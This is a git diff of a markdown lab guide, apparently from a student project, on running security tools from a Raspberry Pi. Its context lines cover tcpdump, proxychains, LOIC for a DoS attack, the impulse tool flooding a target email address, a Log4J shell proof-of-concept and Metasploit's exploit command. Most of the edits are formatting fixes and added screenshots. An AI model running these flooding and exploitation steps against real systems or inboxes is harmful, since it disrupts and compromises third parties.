@@ -406,7 +406,7 @@ Nmap can be used to scan local networks.There are many commands that we can use 
 Tcpdump is a packet analyzer that runs from the command line. TCP/IP and other packets that are transmitted through the network and seen by the system can be intercepted and displayed by using tcpdump. However the Raspberry Pi must be connected to the network to do so.  
 
 ### Setup TcpDump:  
-``sudo apt-get install tcpdump```  
+```sudo apt-get install tcpdump```  
 ![image](https://user-images.githubusercontent.com/97077110/148543181-aec55008-fa02-4a00-99b8-053e773aeed2.png)  
 
 ```sudo tcpdump```  
@@ -454,7 +454,9 @@ From here it show that when we use firefox.exe, our location is in United Kingdo
 
 ![image](https://user-images.githubusercontent.com/97077110/148881496-1ce3b2ec-6be3-4990-8eae-f4a994aec93a.png)  
 
-Proxychain NMAP:    
+Proxychain NMAP:  
+![image](https://user-images.githubusercontent.com/97077110/150097596-688dba82-8bf2-4a7c-83d3-74119e48e7de.png)
+
 
 
 
@@ -530,9 +532,23 @@ Install the mono tool to help us use the executable software by using command ``
 use command ```mono LOIC.exe```  
 ![image](https://user-images.githubusercontent.com/97077110/148887634-1d4f253e-4a37-4d08-a605-501d33ba6cbe.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148887661-5ac9ba8c-eca3-4689-839a-4c98fa2afe0a.png)    
+
+This is the main page of the LOIC:   
+
+![image](https://user-images.githubusercontent.com/97077110/150096957-d8e4dcfc-f0ff-4a75-8991-74aeacfe3e6d.png)
+
+
+Use wireshark to see the packets to show that the DOS attack is successful:  
+![image](https://user-images.githubusercontent.com/97077110/150097039-1c9b4eb3-ad4f-4409-9813-b23eea55c464.png)
+
+
+
 # Tshark  
 ## Installation of Tshark:  
 use command ```sudo apt-get install tshark```  
+
+
+
 Using of tshark:  
 ```
 tshark [ -i <capture interface>|- ] [ -f <capture filter> ] [ -2 ] [ -r <infile> ] [ -w <outfile>|- ] [ options ] [ <filter> ]
@@ -577,12 +593,12 @@ cd impulse
 sudo pip3 install -r requirements.txt    
 ```  
 ![image](https://user-images.githubusercontent.com/97077110/148892577-d0ff727d-6bd7-4501-8d59-f764d1ed7142.png)  
-## using the impulse tool for email:  
+## Using the impulse tool for email:  
 ### Step 1:  
 use command ```python3 impulse.py --method email --threads 2 --target (target email)```  
 ![image](https://user-images.githubusercontent.com/97077110/148902041-a9e829e0-f119-4a1f-9250-6dfa1fac1e46.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148902077-ee711ccf-93c4-415a-8b1e-2c6ffac6ed80.png)   
-target side:  
+Target side:  
 ![image](https://user-images.githubusercontent.com/97077110/148902152-b2f30ca3-86d8-4c87-b7e5-43e9017d56ae.png)  
  
 # Log4J :
@@ -603,7 +619,7 @@ Move the file from downloads to the log4j-shell-proc directory:
 ![image](https://user-images.githubusercontent.com/97077110/149284324-3a4a9672-a21b-4899-8b13-19dfb3ac0fa9.png)  
 
 Extract the file the log4j-shell-poc:  
-```sudo tar -xf jdk-8u202-linux-i586.tar.gz```
+```sudo tar -xf jdk-8u202-linux-i586.tar.gz```  
 ![image](https://user-images.githubusercontent.com/97077110/149284550-bf5bb89b-6124-4cee-aa7a-a842fdc4300a.png)  
 
 Start the http server at log4j-shell-poc:  
@@ -649,7 +665,7 @@ Run ```msfconsole ```
 ```set LHOST (host ip)```
 ![image](https://user-images.githubusercontent.com/97077110/149287351-099f5084-6874-44f9-93bf-8eb7cdf15200.png)
 
-```exploit```
+```exploit```  
 ![image](https://user-images.githubusercontent.com/97077110/149287459-ad5c6c9b-f783-4ed2-a947-bba6fafbf477.png)  
 
 
